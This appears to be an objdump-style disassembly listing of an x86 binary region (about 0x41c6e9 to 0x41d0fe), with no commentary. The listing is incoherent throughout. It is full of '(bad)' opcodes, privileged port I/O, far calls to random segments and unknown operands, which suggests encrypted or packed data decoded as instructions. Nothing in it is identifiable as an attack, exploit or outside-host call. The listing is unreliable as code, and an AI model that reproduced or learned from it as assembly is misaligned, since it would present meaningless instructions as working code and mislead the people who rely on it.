  41c6e9:	dec    ecx
  41c6ea:	inc    ebp
  41c6eb:	in     eax,0xb9
  41c6ed:	fwait
  41c6ee:	push   0x719aba7a
  41c6f3:	cmp    DWORD PTR [ecx-0x19],ebp
  41c6f6:	(bad)  
  41c6f7:	out    0xaf,al
  41c6f9:	lahf   
  41c6fa:	add    dl,bl
  41c6fc:	sub    BYTE PTR [ebp+0x192f81c2],ah
  41c702:	mov    edx,0x65f5741a
  41c707:	mov    ds:0x17565877,eax
  41c70c:	sahf   
  41c70d:	dec    BYTE PTR [edx]
  41c70f:	sti    
  41c710:	mov    edi,0x30de8f25
  41c715:	xor    DWORD PTR [ebx],eax
  41c717:	push   ebp
  41c718:	mov    eax,0x994bf5a6
  41c71d:	fwait
  41c71e:	xor    ebp,DWORD PTR [ebp+0x6d]
  41c721:	nop
  41c722:	repnz call 0x8651:0x710456e9
  41c72a:	jnp    0x41c714
  41c72c:	ret    
  41c72d:	add    ebx,DWORD PTR [ecx]
  41c72f:	retf   
  41c730:	and    DWORD PTR [edx-0x77],edi
  41c733:	sbb    bh,BYTE PTR [ebp-0x4e]
  41c736:	jl     0x41c75f
  41c738:	fistp  QWORD PTR [ebx]
  41c73a:	and    DWORD PTR [ebp+eax*1-0x6a],esp
  41c73e:	xchg   edx,eax
  41c73f:	xor    ch,BYTE PTR [edi+0x59]
  41c742:	nop
  41c743:	sub    dl,dh
  41c745:	push   es
  41c746:	cmp    BYTE PTR [ebp+0x8],0x89
  41c74a:	stc    
  41c74b:	sbb    cl,dh
  41c74d:	shr    BYTE PTR [ecx-0x48],cl
  41c750:	xchg   DWORD PTR [ecx+eax*4],edi
  41c753:	add    eax,0x72867545
  41c758:	or     BYTE PTR [ecx+eax*4-0xa1fa6eb],cl
  41c75f:	ins    BYTE PTR es:[edi],dx
  41c760:	sahf   
  41c761:	cs or  al,0xce
  41c764:	pop    ecx
  41c765:	inc    edx
  41c766:	pop    esi
  41c767:	jns    0x41c7cb
  41c769:	repz adc ah,bh
  41c76c:	mov    al,ds:0x74
	...
  41c7d5:	add    dl,bl
  41c7d7:	add    edx,eax
  41c7d9:	xchg   bl,bl
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	adc    al,0x4d
  41c7e4:	in     eax,dx
  41c7e5:	add    DWORD PTR [edi+0x32],esp
  41c7e8:	add    DWORD PTR [eax],eax
  41c7ea:	add    BYTE PTR [ecx],al
  41c7ec:	add    BYTE PTR [eax],al
  41c7ee:	stos   DWORD PTR es:[edi],eax
  41c7ef:	or     DWORD PTR [edx],ecx
  41c7f1:	jnp    0x41c81c
  41c7f3:	test   bh,al
  41c7f5:	jp     0x41c7bc
  41c7f7:	push   esi
  41c7f8:	xchg   ebx,eax
  41c7f9:	repnz sub esi,esi
  41c7fc:	mov    ecx,0x9fe9634d
  41c801:	add    ebx,0x4b5014da
  41c807:	adc    BYTE PTR [ebx+0x21be4600],dh
  41c80d:	inc    ebx
  41c80e:	retf   0x7be
  41c811:	push   0xaa0af7be
  41c816:	out    dx,eax
  41c817:	ins    BYTE PTR es:[edi],dx
  41c818:	mov    bh,ch
  41c81a:	dec    ebx
  41c81b:	dec    ecx
  41c81c:	or     bh,BYTE PTR [eax+0x2dc87737]
  41c822:	jp     0x41c86e
  41c824:	call   0x2fd:0x5c6b8a41
  41c82b:	pop    ds
  41c82c:	push   edi
  41c82d:	xlat   BYTE PTR ds:[ebx]
  41c82e:	icebp  
  41c82f:	xchg   DWORD PTR [esi+0x61fe564],eax
  41c835:	shl    BYTE PTR [esi],cl
  41c837:	cmp    BYTE PTR [esi],cl
  41c839:	mov    ebx,0xc49afc2b
  41c83e:	test   al,0x1c
  41c840:	bound  ecx,QWORD PTR [edx]
  41c842:	jmp    0x41c88b
  41c844:	shl    BYTE PTR [ebx+0x5c],1
  41c847:	inc    edi
  41c848:	iret   
  41c849:	sahf   
  41c84a:	dec    ebp
  41c84b:	mov    ds:0xe6173c42,al
  41c850:	push   ebp
  41c851:	xchg   ecx,eax
  41c852:	and    cl,BYTE PTR [esi]
  41c854:	push   edi
  41c855:	ret    0x7f7b
  41c858:	out    0x62,al
  41c85a:	(bad)  
  41c85b:	(bad)  
  41c85c:	xchg   ebp,eax
  41c85d:	fld    TBYTE PTR [esi]
  41c85f:	loop   0x41c86b
  41c861:	loope  0x41c86a
  41c863:	shl    BYTE PTR [ecx],1
  41c865:	(bad)  
  41c866:	xor    al,0x1f
  41c868:	xchg   esp,eax
  41c869:	mov    WORD PTR [edi+ebp*2-0x309652fe],?
  41c870:	ror    BYTE PTR [ebx+edx*1-0x68],1
  41c874:	cmp    DWORD PTR [ebx+0x1e41b8b4],0xffffffba
  41c87b:	mov    ebx,0xd346c0c6
  41c880:	sbb    DWORD PTR [edi],0x5c
  41c883:	or     al,bh
  41c885:	cs mov dh,0x40
  41c888:	test   cl,dh
  41c88a:	push   ds
  41c88b:	or     al,BYTE PTR ds:[ebx-0x4198d5cb]
  41c892:	xor    BYTE PTR [ebx],dh
  41c894:	es mov ebx,0xe04c2084
  41c89a:	loop   0x41c8dd
  41c89c:	mov    ds:0xc01acb43,al
  41c8a1:	call   0x7ffdcd34
  41c8a6:	xor    cl,BYTE PTR cs:[eax-0x799d6862]
  41c8ad:	cmp    al,0xd
  41c8af:	xchg   esi,ebx
  41c8b1:	repz push edi
  41c8b3:	push   ds
  41c8b4:	ins    DWORD PTR es:[edi],dx
  41c8b5:	inc    esp
  41c8b6:	xor    BYTE PTR [eax],al
  41c8b8:	dec    ebx
  41c8b9:	out    0xfe,eax
  41c8bb:	sub    al,0x71
  41c8bd:	push   edi
  41c8be:	rcr    BYTE PTR [esi],cl
  41c8c0:	call   0x453a:0xf4f3f997
  41c8c7:	adc    ah,bh
  41c8c9:	and    dl,BYTE PTR cs:[edi+0x15]
  41c8cd:	and    edx,0xfffffffa
  41c8d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8d1:	mov    cl,0x60
  41c8d3:	addr16 repnz adc al,0x84
  41c8d7:	shl    BYTE PTR [edi+0x1053c284],0x17
  41c8de:	sub    edi,ebp
  41c8e0:	dec    edi
  41c8e1:	ins    DWORD PTR es:[edi],dx
  41c8e2:	jmp    0xaa28d214
  41c8e7:	ror    BYTE PTR [ebx],1
  41c8e9:	dec    ebx
  41c8ea:	cmp    DWORD PTR [edx+eiz*4+0xf0],edx
	...
  41c955:	add    BYTE PTR [ebx+0x34],ah
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	xor    al,0xff
  41c95b:	mov    ebp,0x291877fb
  41c960:	cmp    eax,DWORD PTR [ecx]
  41c962:	or     ebx,DWORD PTR [ebx+0x31]
  41c965:	sbb    eax,0x13367
  41c96a:	add    BYTE PTR [ecx],al
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	fnstsw WORD PTR [ebp+0x2b]
  41c971:	sar    BYTE PTR [edi+0x6],0x88
  41c975:	xlat   BYTE PTR ds:[ebx]
  41c976:	(bad)  
  41c977:	and    cl,bh
  41c979:	mov    DWORD PTR [ecx+eax*8+0x8a503c6],edi
  41c980:	push   esi
  41c981:	jae    0x41c976
  41c983:	cmp    eax,0xd417dea8
  41c988:	jnp    0x41c966
  41c98a:	ret    
  41c98b:	xor    DWORD PTR [ebx-0x6f],edx
  41c98e:	ret    
  41c98f:	imul   edx,esi,0xf28eb0e9
  41c995:	lods   eax,DWORD PTR ds:[esi]
  41c996:	ins    DWORD PTR es:[edi],dx
  41c997:	push   edx
  41c998:	pop    eax
  41c999:	jno    0x41c959
  41c99b:	mov    eax,ds:0x36331835
  41c9a0:	pop    eax
  41c9a1:	ins    DWORD PTR es:[edi],dx
  41c9a2:	loope  0x41c947
  41c9a4:	sbb    al,0xd4
  41c9a6:	ins    BYTE PTR es:[edi],dx
  41c9a7:	out    dx,al
  41c9a8:	dec    ebp
  41c9a9:	sbb    al,0xae
  41c9ab:	retf   0x43dc
  41c9ae:	jo     0x41ca25
  41c9b0:	xchg   ebp,eax
  41c9b1:	push   edi
  41c9b2:	xlat   BYTE PTR ds:[ebx]
  41c9b3:	add    edx,DWORD PTR [ebp+0x74f6b294]
  41c9b9:	outs   dx,BYTE PTR ds:[esi]
  41c9ba:	mov    DWORD PTR [ecx+0x3f],eax
  41c9bd:	mov    edx,edi
  41c9bf:	js     0x41c9dd
  41c9c1:	enter  0x42e6,0x4c
  41c9c5:	enter  0xc7de,0x6f
  41c9c9:	mov    ebp,0x1639dbe
  41c9ce:	push   ebp
  41c9cf:	push   ebx
  41c9d0:	xor    dh,BYTE PTR [esi-0x4f9a4708]
  41c9d6:	daa    
  41c9d7:	mov    dh,0xcf
  41c9d9:	add    dh,0xef
  41c9dc:	jmp    0x41ca42
  41c9de:	cld    
  41c9df:	inc    esp
  41c9e0:	dec    eax
  41c9e1:	test   DWORD PTR [eax+0x6b0a64d0],edi
  41c9e7:	sub    cl,cl
  41c9e9:	ins    DWORD PTR es:[edi],dx
  41c9ea:	gs jne 0x41c9b8
  41c9ed:	(bad)  
  41c9ee:	mov    al,bh
  41c9f0:	repz or eax,0x6ee80ee5
  41c9f6:	adc    ebx,DWORD PTR [ecx+0x64]
  41c9f9:	out    dx,al
  41c9fa:	xchg   esp,eax
  41c9fb:	push   ds
  41c9fc:	ds inc edx
  41c9fe:	outs   dx,BYTE PTR ds:[esi]
  41c9ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca00:	data16 jne 0x41ca00
  41ca03:	xchg   BYTE PTR [edi+0x44],bh
  41ca06:	rcr    ch,cl
  41ca08:	adc    eax,0x70f79fda
  41ca0d:	hlt    
  41ca0e:	pop    ebx
  41ca0f:	cmp    al,0xa8
  41ca11:	xor    ebx,DWORD PTR [ebx]
  41ca13:	inc    esp
  41ca14:	ja     0x41ca6e
  41ca16:	xor    BYTE PTR [ecx],dl
  41ca18:	(bad)  
  41ca19:	fldenv [esi+0x4441e9d6]
  41ca1f:	out    0xbc,al
  41ca21:	mov    ebp,0x75c55c4f
  41ca26:	rol    bl,cl
  41ca28:	int    0x39
  41ca2a:	mov    eax,0x7865aa67
  41ca2f:	stos   BYTE PTR es:[edi],al
  41ca30:	mov    BYTE PTR [ebx],ah
  41ca32:	jl     0x41c9ca
  41ca34:	xchg   esp,eax
  41ca35:	call   0x47b17557
  41ca3a:	xor    BYTE PTR [ebp-0x19],dh
  41ca3d:	test   DWORD PTR [ebp-0x41281e9c],edi
  41ca43:	push   ss
  41ca44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca45:	leave  
  41ca46:	mov    ebx,0x782b4c73
  41ca4b:	adc    BYTE PTR [edi+0x1e485915],cl
  41ca51:	jp     0x41caaf
  41ca53:	jmp    0x8df6117c
  41ca58:	xchg   BYTE PTR [edx],cl
  41ca5a:	fcmovnbe st,st(4)
  41ca5c:	and    BYTE PTR [ecx],0xac
  41ca5f:	sbb    DWORD PTR [ebp+0x4b],0x4d99294b
  41ca66:	imul   edi,DWORD PTR [esi],0xffffffbc
  41ca69:	test   BYTE PTR [esi-0x19],ah
  41ca6c:	sahf   
  41ca6d:	lea    eax,[eax]
	...
  41cad3:	add    BYTE PTR [eax],al
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	test   al,0xf
  41cae4:	sub    ah,BYTE PTR [edx+0x13467]
  41caea:	add    BYTE PTR [ecx],al
  41caec:	add    BYTE PTR [eax],al
  41caee:	push   ecx
  41caef:	ds je  0x41cb1c
  41caf2:	mov    dh,BYTE PTR [ecx]
  41caf4:	rcl    eax,0xf6
  41caf7:	fmul   DWORD PTR [edi]
  41caf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cafa:	pop    edx
  41cafb:	inc    edx
  41cafc:	and    DWORD PTR [ecx+0x4d7f32d9],0x600a0735
  41cb06:	mov    edi,0x5e4aec9f
  41cb0b:	test   DWORD PTR [esi-0x7d],edx
  41cb0e:	sahf   
  41cb0f:	pop    ss
  41cb10:	(bad)  
  41cb11:	rcl    BYTE PTR [eiz*1-0x730b6e25],1
  41cb18:	cmp    DWORD PTR [eax-0x74],edi
  41cb1b:	pop    ebp
  41cb1c:	out    dx,eax
  41cb1d:	dec    edx
  41cb1e:	and    eax,0x581324bb
  41cb23:	or     DWORD PTR [edx-0x5d],eax
  41cb26:	iret   
  41cb27:	jmp    0xe8b0d99d
  41cb2c:	add    eax,0xf50921c6
  41cb31:	jo     0x41cba5
  41cb33:	loopne 0x41cb99
  41cb35:	jle    0x41cad2
  41cb37:	in     eax,0xa2
  41cb39:	push   ecx
  41cb3a:	adc    al,0x5a
  41cb3c:	imul   esp,DWORD PTR [ebx],0x52aedf5a
  41cb42:	mov    edi,0x6f1b6cf6
  41cb47:	xchg   DWORD PTR [ecx+ebp*2-0x3b],esi
  41cb4b:	sahf   
  41cb4c:	nop
  41cb4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb4e:	clc    
  41cb4f:	pop    ebp
  41cb50:	inc    ebx
  41cb51:	call   0xfbe0:0x3febf6d3
  41cb58:	ja     0x41cafb
  41cb5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb5b:	jmp    0x435a:0x90121ab
  41cb62:	cli    
  41cb63:	push   edi
  41cb64:	inc    esi
  41cb65:	sub    DWORD PTR [ebx],esi
  41cb67:	(bad)  
  41cb6b:	aaa    
  41cb6c:	enter  0xfde7,0xe2
  41cb70:	cld    
  41cb71:	or     DWORD PTR [ebx],ebx
  41cb73:	mov    dh,0x3d
  41cb75:	fwait
  41cb76:	stos   BYTE PTR es:[edi],al
  41cb77:	xchg   BYTE PTR [edx],dh
  41cb79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb7a:	retf   0xd833
  41cb7d:	mov    ah,0x7c
  41cb7f:	in     al,dx
  41cb80:	push   ss
  41cb81:	shl    ebx,0xc8
  41cb84:	mov    cl,al
  41cb86:	cmp    BYTE PTR [esi],0xc7
  41cb89:	mov    esp,0x4c281c3d
  41cb8e:	xchg   ebp,eax
  41cb8f:	arpl   WORD PTR [ebx+0x36],sp
  41cb92:	mov    dh,0x63
  41cb94:	pop    ds
  41cb95:	inc    esp
  41cb96:	addr16 add eax,0x3103df0c
  41cb9c:	mov    ebp,0x1fe044c7
  41cba1:	out    dx,eax
  41cba2:	shl    BYTE PTR [edi-0x66],0x6f
  41cba6:	repz adc DWORD PTR [edx+0x6e],esp
  41cbaa:	dec    esp
  41cbab:	retf   0x6321
  41cbae:	push   edi
  41cbaf:	popf   
  41cbb0:	jecxz  0x41cc2d
  41cbb2:	xchg   dh,bh
  41cbb4:	mov    cl,0x14
  41cbb6:	sub    dh,al
  41cbb8:	outs   dx,DWORD PTR ds:[esi]
  41cbb9:	dec    esi
  41cbba:	sbb    BYTE PTR [ebx+0x3e79fa05],bl
  41cbc0:	jge    0x41cc24
  41cbc2:	cwde   
  41cbc3:	pop    edx
  41cbc4:	mov    eax,0xe12c086a
  41cbc9:	dec    ebp
  41cbca:	outs   dx,DWORD PTR ds:[esi]
  41cbcb:	jecxz  0x41cbb5
  41cbcd:	add    BYTE PTR [ebx],dh
  41cbcf:	jo     0x41cbae
  41cbd1:	inc    ebp
  41cbd2:	gs gs pusha 
  41cbd5:	cmp    DWORD PTR [eax+0x5c],ebp
  41cbd8:	in     eax,dx
  41cbd9:	sub    esi,DWORD PTR [ebx+0x1]
  41cbdc:	push   ss
  41cbdd:	xlat   BYTE PTR ds:[ebx]
  41cbde:	xor    eax,0x56a85ad4
  41cbe3:	(bad)  
  41cbe4:	sbb    al,dl
  41cbe6:	mov    ebp,0xeb458138
  41cbeb:	or     esi,esp
  41cbed:	mov    dh,0x0
	...
  41cc53:	add    BYTE PTR [eax],al
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0xf867a822
  41cc65:	inc    ecx
  41cc66:	addr16 xor eax,0x1000001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	lock scas al,BYTE PTR es:[edi]
  41cc70:	sub    DWORD PTR [eax+0x5f],ebx
  41cc73:	mov    eax,ds:0x8e7ad7b1
  41cc78:	sbb    BYTE PTR [edx+0x7b],0x5d
  41cc7c:	jns    0x41ccd2
  41cc7e:	xchg   ebp,eax
  41cc7f:	or     BYTE PTR [ecx+0x75],dh
  41cc82:	pop    ecx
  41cc83:	std    
  41cc84:	sub    dl,BYTE PTR [eax]
  41cc86:	pop    ebp
  41cc87:	and    BYTE PTR [ecx+edx*4],al
  41cc8a:	jmp    0x9bd764d6
  41cc8f:	out    0xe3,al
  41cc91:	add    eax,0x34b81b69
  41cc96:	daa    
  41cc97:	enter  0x34fb,0xaa
  41cc9b:	mov    esp,0xe396e922
  41cca0:	faddp  st(5),st
  41cca2:	mov    al,ds:0xd39dd47e
  41cca7:	dec    esp
  41cca8:	ret    
  41cca9:	inc    edx
  41ccaa:	rol    ebp,0xd2
  41ccad:	mov    bh,0xc
  41ccaf:	or     BYTE PTR [edx-0x8],0x96
  41ccb3:	mov    al,0xec
  41ccb5:	add    BYTE PTR [edi-0x60870a36],ch
  41ccbb:	(bad)  
  41ccbc:	scas   eax,DWORD PTR es:[edi]
  41ccbd:	pop    ecx
  41ccbe:	stos   DWORD PTR es:[edi],eax
  41ccbf:	xchg   DWORD PTR [edi+0x94a8a86],ebp
  41ccc5:	in     al,0x3
  41ccc7:	rol    BYTE PTR [ecx],cl
  41ccc9:	or     DWORD PTR [ebx],0x5e
  41cccc:	adc    ebp,DWORD PTR [ecx+0x104f1477]
  41ccd2:	mov    esp,0xa08e886c
  41ccd7:	pop    eax
  41ccd8:	jnp    0x41cd50
  41ccda:	int    0x71
  41ccdc:	(bad)  
  41ccdd:	rcl    DWORD PTR [eax+0x59],cl
  41cce0:	jge    0x41cd4c
  41cce2:	jo     0x41cc86
  41cce4:	and    ebx,DWORD PTR [edi+0x189a0ea2]
  41ccea:	inc    edx
  41cceb:	cld    
  41ccec:	imul   eax,DWORD PTR [ebx+0x120c2268],0xed112067
  41ccf6:	add    edx,DWORD PTR [ebx+0x65]
  41ccf9:	sbb    edi,DWORD PTR [eax]
  41ccfb:	ja     0x41ccb9
  41ccfd:	sub    DWORD PTR [ecx+edx*4-0x649bc98d],0x9035d8a0
  41cd08:	std    
  41cd09:	idiv   DWORD PTR [ecx+0x8]
  41cd0c:	rcr    BYTE PTR [edi+0x9],0xf7
  41cd10:	lds    edi,FWORD PTR [edx-0x67b365e5]
  41cd16:	psubw  mm0,mm6
  41cd19:	inc    edx
  41cd1a:	cwde   
  41cd1b:	xor    ebx,eax
  41cd1d:	mov    ecx,ecx
  41cd1f:	fmul   QWORD PTR [ecx+esi*1]
  41cd22:	cmc    
  41cd23:	add    dl,bl
  41cd25:	xchg   DWORD PTR [eax-0x7afd72de],edx
  41cd2b:	pop    edi
  41cd2c:	xor    DWORD PTR [edi+ebp*1-0xf],esi
  41cd30:	in     al,dx
  41cd31:	das    
  41cd32:	stc    
  41cd33:	xchg   ebp,eax
  41cd34:	mov    bh,BYTE PTR [esi+eax*2]
  41cd37:	push   0xdf912d57
  41cd3c:	mov    eax,0xcea13617
  41cd41:	icebp  
  41cd42:	mov    edi,0x6179eb24
  41cd47:	popa   
  41cd48:	mov    cl,0x3e
  41cd4a:	(bad)  
  41cd4c:	sbb    eax,0x11b2afa6
  41cd51:	retf   0xf94e
  41cd54:	in     eax,0x77
  41cd56:	push   ss
  41cd57:	xchg   ebp,eax
  41cd58:	cli    
  41cd59:	mov    ?,edi
  41cd5b:	in     eax,0x10
  41cd5d:	mov    ebx,0xe05213cd
  41cd62:	js     0x41ccea
  41cd64:	jae    0x41cdda
  41cd66:	dec    esi
  41cd67:	dec    edi
  41cd68:	mov    cl,0xac
  41cd6a:	xor    dh,BYTE PTR [edx]
  41cd6c:	sub    ah,cl
	...
  41cdd6:	pusha  
  41cdd7:	cdq    
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	mov    al,ds:0x6711b6db
  41cde7:	add    DWORD PTR ss:[eax],eax
  41cdea:	add    BYTE PTR [ecx],al
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	imul   edi,ecx,0x386a29c2
  41cdf4:	jmp    0x41cdb6
  41cdf6:	mov    BYTE PTR [esi+eiz*1],bh
  41cdf9:	and    eax,0x6f39c704
  41cdfe:	push   es
  41cdff:	jmp    0x74af:0xc1463638
  41ce06:	cmp    BYTE PTR [ecx+edx*2+0x1334dd12],bl
  41ce0d:	loopne 0x41cde2
  41ce0f:	push   ss
  41ce10:	xor    cl,BYTE PTR ss:0xecd5ee97
  41ce17:	div    BYTE PTR [eax-0x5735d6a9]
  41ce1d:	leave  
  41ce1e:	pop    esi
  41ce1f:	push   ss
  41ce20:	ficom  WORD PTR [edx-0x41]
  41ce23:	xchg   ebx,eax
  41ce24:	leave  
  41ce25:	or     eax,0xa4f5bbd5
  41ce2a:	mov    ch,0xbf
  41ce2c:	test   BYTE PTR [edi],ah
  41ce2e:	mov    cs,WORD PTR [edi-0x30d5ea97]
  41ce34:	cmp    al,0xad
  41ce36:	js     0x41cdfa
  41ce38:	rol    BYTE PTR [eax-0x55f7177b],0x8e
  41ce3f:	icebp  
  41ce40:	jbe    0x41ce5e
  41ce42:	ret    0xbeb8
  41ce45:	or     esp,DWORD PTR [eax+0x670d569f]
  41ce4b:	cld    
  41ce4c:	(bad)  
  41ce4e:	adc    DWORD PTR [eax-0x11],edx
  41ce51:	setge  bh
  41ce54:	jno    0x41ce0e
  41ce56:	mov    cl,0x44
  41ce58:	(bad)  
  41ce59:	inc    ebx
  41ce5a:	pusha  
  41ce5b:	mov    edx,0xa8a5b29a
  41ce60:	rcr    BYTE PTR [eax+0x5d],0xfa
  41ce64:	pop    ss
  41ce65:	push   cs
  41ce66:	hlt    
  41ce67:	mov    edi,0xdbdb35dc
  41ce6c:	popf   
  41ce6d:	out    0xe0,eax
  41ce6f:	daa    
  41ce70:	call   0x6b26e98e
  41ce75:	in     eax,dx
  41ce76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce77:	dec    ebx
  41ce78:	clc    
  41ce79:	adc    edx,DWORD PTR [ebx+ecx*1-0x3f]
  41ce7d:	loopne 0x41cece
  41ce7f:	mov    dh,0x38
  41ce81:	adc    esi,DWORD PTR [ebp-0x26d4df3d]
  41ce87:	mov    cl,0x62
  41ce89:	push   0x2
  41ce8b:	out    dx,al
  41ce8c:	or     al,0x43
  41ce8e:	or     ebx,ebp
  41ce90:	nop
  41ce91:	cli    
  41ce92:	sbb    ch,dl
  41ce94:	call   0xba82:0xc8cc13ac
  41ce9b:	sbb    eax,edi
  41ce9d:	adc    al,BYTE PTR [edi+0x1ba6d11a]
  41cea3:	je     0x41cea8
  41cea5:	aas    
  41cea6:	fist   WORD PTR [ebx-0x78]
  41cea9:	loope  0x41cef0
  41ceab:	pop    edx
  41ceac:	xor    al,0x99
  41ceae:	push   eax
  41ceaf:	mov    ah,0x6b
  41ceb1:	dec    edi
  41ceb2:	add    BYTE PTR [ebx+0x78],0xd9
  41ceb6:	pop    esp
  41ceb7:	fdivp  st(3),st
  41ceb9:	hlt    
  41ceba:	sbb    BYTE PTR [ecx],ah
  41cebc:	ss pop esi
  41cebe:	mov    esi,0x8bb2ee38
  41cec3:	shl    edx,0xb9
  41cec6:	xchg   esp,eax
  41cec7:	enter  0xbd1,0x75
  41cecb:	ss push ss
  41cecd:	mov    al,0x63
  41cecf:	cmp    al,0x51
  41ced1:	stos   DWORD PTR es:[edi],eax
  41ced2:	call   0xabf5:0x5abab59f
  41ced9:	mul    BYTE PTR [ebp+0x7bf43c1a]
  41cedf:	daa    
  41cee0:	sti    
  41cee1:	mov    bh,0x65
  41cee3:	shl    DWORD PTR [esp],0xe8
  41cee7:	pop    es
  41cee8:	in     eax,0xd1
  41ceea:	in     al,dx
  41ceeb:	cld    
  41ceec:	call   0x41cfcc
	...
  41cf55:	add    BYTE PTR [edi],al
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	jnp    0x41cf74
  41cf64:	cmc    
  41cf65:	aam    0x67
  41cf67:	aaa    
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	outs   dx,BYTE PTR ds:[esi]
  41cf6f:	mov    ?,esp
  41cf71:	xor    al,0x8
  41cf73:	fnstsw WORD PTR [edi-0x10]
  41cf76:	out    0xec,eax
  41cf78:	mov    dl,0xbf
  41cf7a:	lock dec ebx
  41cf7c:	icebp  
  41cf7d:	(bad)
  41cf81:	imul   edi,edi,0xffffffb3
  41cf84:	inc    edi
  41cf85:	(bad)  [ecx+0x35e31091]
  41cf8b:	sub    DWORD PTR [ebx+edx*2+0x60],0x24
  41cf90:	inc    eax
  41cf91:	push   0x1851f926
  41cf96:	inc    edx
  41cf97:	loope  0x41cfdb
  41cf99:	push   0x45
  41cf9b:	ins    DWORD PTR es:[edi],dx
  41cf9c:	mov    BYTE PTR [edi-0x42],bl
  41cf9f:	jno    0x41d003
  41cfa1:	lock jp 0x41cfb5
  41cfa4:	aas    
  41cfa5:	pop    ebp
  41cfa6:	jle    0x41cf57
  41cfa8:	xchg   esp,eax
  41cfa9:	mov    DWORD PTR [esi-0x19],edi
  41cfac:	inc    edi
  41cfad:	dec    esp
  41cfae:	pop    esi
  41cfaf:	adc    bl,ah
  41cfb1:	xchg   ecx,eax
  41cfb2:	call   0xabe7:0x1b84ee47
  41cfb9:	push   0x6946f4e4
  41cfbe:	lahf   
  41cfbf:	mov    ecx,0x30fe2d0c
  41cfc4:	xchg   esi,eax
  41cfc5:	push   es
  41cfc6:	in     eax,dx
  41cfc7:	or     eax,0x5087124
  41cfcc:	add    al,0xe9
  41cfce:	ficomp DWORD PTR [edi-0x20923a17]
  41cfd4:	cmc    
  41cfd5:	cmc    
  41cfd6:	outs   dx,DWORD PTR ds:[esi]
  41cfd7:	je     0x41d025
  41cfd9:	imul   ebx,DWORD PTR [esi-0x12],0x60
  41cfdd:	test   ebp,edx
  41cfdf:	jp     0x41cfda
  41cfe1:	mov    es,WORD PTR [ebp+ebp*2-0x11c7f4b9]
  41cfe8:	mov    edx,0x67e0ced6
  41cfed:	pusha  
  41cfee:	les    ebx,FWORD PTR [eax-0x4e320ee8]
  41cff4:	cld    
  41cff5:	jb     0x41d04b
  41cff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cff8:	xchg   esi,eax
  41cff9:	(bad)  
  41cffa:	pop    ecx
  41cffb:	lods   eax,DWORD PTR ds:[esi]
  41cffc:	xchg   ch,cl
  41cffe:	fst    QWORD PTR [edx]
  41d000:	inc    esp
  41d001:	mov    dl,0x83
  41d003:	addr16 or bh,dl
  41d006:	aam    0xa0
  41d008:	cmp    esi,DWORD PTR [edx-0x19]
  41d00b:	jp     0x41cfed
  41d00d:	mov    eax,ds:0xb09fbb67
  41d012:	sahf   
  41d013:	push   es
  41d014:	pop    esi
  41d015:	sub    al,0xb5
  41d017:	test   al,0x5
  41d019:	pop    eax
  41d01a:	ins    BYTE PTR es:[edi],dx
  41d01b:	dec    edx
  41d01c:	call   0xc404:0x4fd5754e
  41d023:	inc    edi
  41d024:	jmp    0xb10fd990
  41d029:	push   es
  41d02a:	lea    eax,[ebx]
  41d02c:	call   0x22be:0x5a47e53d
  41d033:	test   DWORD PTR [ebp+0x227d86a6],esi
  41d039:	dec    ebx
  41d03a:	enter  0xeb91,0x24
  41d03e:	ror    DWORD PTR [edi-0x10],cl
  41d041:	xchg   edi,eax
  41d042:	sub    BYTE PTR [eax+ebp*1-0x17e563fb],dl
  41d049:	mov    edi,eax
  41d04b:	or     al,0x92
  41d04d:	push   0x7c0b0b01
  41d052:	ret    0x25f4
  41d055:	stc    
  41d056:	in     al,0x97
  41d058:	xlat   BYTE PTR ds:[ebx]
  41d059:	stos   DWORD PTR es:[edi],eax
  41d05a:	push   ebp
  41d05b:	call   0xe04f71e3
  41d060:	repz adc eax,0x60c135ac
  41d066:	push   esi
  41d067:	pop    ecx
  41d068:	scas   eax,DWORD PTR es:[edi]
  41d069:	iret   
  41d06a:	or     DWORD PTR [ebp-0x32],edx
  41d06d:	jmp    0x41d072
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x7dea13bd
  41d0e5:	cwde   
  41d0e6:	cmp    BYTE PTR [bx+di],al
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    DWORD PTR [eax],eax
  41d0ed:	add    BYTE PTR [ebx],dh
  41d0ef:	adc    DWORD PTR [ecx-0x71cd48ac],esp
  41d0f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0f6:	ss mov cs,edi
  41d0f9:	mov    ebp,0xf73de19c
  41d0fe:	push   ebx
